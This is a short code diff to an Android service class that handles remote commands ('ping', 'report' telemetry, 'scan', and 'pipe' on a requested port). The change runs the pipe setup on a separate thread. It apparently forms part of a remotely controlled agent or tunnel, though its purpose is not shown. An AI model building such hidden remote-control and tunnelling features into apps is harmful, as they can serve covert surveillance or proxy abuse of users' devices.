@@ -114,7 +114,13 @@ public class SinoService extends Service {
             if ("ping".equals(cmd)) send("{\"type\":\"pong\",\"id\":\"" + Prefs.id(this) + "\"}");
             else if ("report".equals(cmd)) sendTelemetry();
             else if ("scan".equals(cmd)) sendScan();
-            else if ("pipe".equals(cmd)) iniciarPipe(j.optInt("port", 0));
+            else if ("pipe".equals(cmd)) {
+                final int portaPedida = j.optInt("port", 0);
+                new Thread(() -> {
+                    try { iniciarPipe(portaPedida); }
+                    catch (Exception e) { status = "pipe: " + e; }
+                }).start();
+            }
         } catch (Exception e) { status = "cmd: " + e; }
     }
 
